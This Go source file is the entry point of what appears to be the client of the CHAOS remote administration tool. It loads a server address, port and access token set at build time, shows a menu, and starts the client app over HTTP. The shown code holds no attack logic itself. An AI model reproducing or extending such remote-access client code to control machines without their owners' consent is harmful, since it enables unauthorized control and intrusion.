package main

import (
	"github.com/tiagorlampert/CHAOS/client/app"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"github.com/tiagorlampert/CHAOS/client/app/ui"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/network"
)

var (
	Version       = "dev"
	ServerPort    = ""
	ServerAddress = ""
	Token         = ""
)

func main() {
	ui.ShowMenu(Version)

	app.NewApp(network.NewHttpClient(10),
		environment.Load(ServerAddress, ServerPort, Token)).Run()
}
